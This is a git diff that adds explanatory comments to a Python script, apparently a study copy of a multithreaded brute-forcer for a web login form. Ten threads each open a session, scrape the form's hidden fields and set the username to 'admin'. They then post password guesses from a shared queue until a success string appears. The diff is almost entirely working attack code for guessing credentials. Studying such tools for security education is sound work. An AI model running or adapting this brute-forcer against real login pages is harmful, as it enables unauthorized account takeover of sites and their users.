@@ -63,20 +63,32 @@ class Bruter:
         for _ in range(10):
             t = threading.Thread(target=self.web_bruter, args=(passwords,))
             t.start()                                           # The thread begins executing self.web_bruter(passwords).
+                                                                # run_bruteforce() starts the threads, but web web_bruter() does the actual work.
     
-    def web_bruter(self, passwords):
-        session = requests.Session()
-        resp0 = session.get(self.url)
-        params = get_params(resp0.content)
-        params['log'] = self.username
 
+    # Worker method run by each thread: sends requests using passwords
+    # from the shared queue(passwords) until a match is found or the queue is empty.
+    def web_bruter(self, passwords):
+        session = requests.Session()                            # Creates a session object to remember things(cookies;settings;reused network connections) between requests. 
+        # Sends a GET request to the URL, 
+        # and saves the server’s reply in resp0:
+        resp0 = session.get(self.url)                           # The thread is using the same session object for both requests(GET & POST).
+        # Passes the raw response body (resp0.content) 
+        # into get_params:
+        params = get_params(resp0.content)                      # get_params() returns a dictionary of HTML input names/values. That dictionary is stored in `params`.
+        params['log'] = self.username                           # Adds the 'log' key in the dictionary. So `log` is `admin` now (from `b = Bruter('admin', TARGET)`). 
+                                                                # Once log is set to admin, the later loop keeps changing only the password field while the username stays the same.
+
+
+        # Starts a loop.It continues while: 
+        # 1. the queue is not empty; 2. success has not been found.
         while not passwords.empty() and not self.found:
             time.sleep(5)
             passwd = passwords.get()
             print(f'Trying username/password {self.username}/{passwd:<10}')
             params['pwd'] = passwd
 
-            resp1 = session.post(self.url, data=params)
+            resp1 = session.post(self.url, data=params)         # 10 threads create 10 separate sessions.
             if SUCCESS in resp1.content.decode():
                 self.found = True
                 print(f"\nBruteforcing successful.")
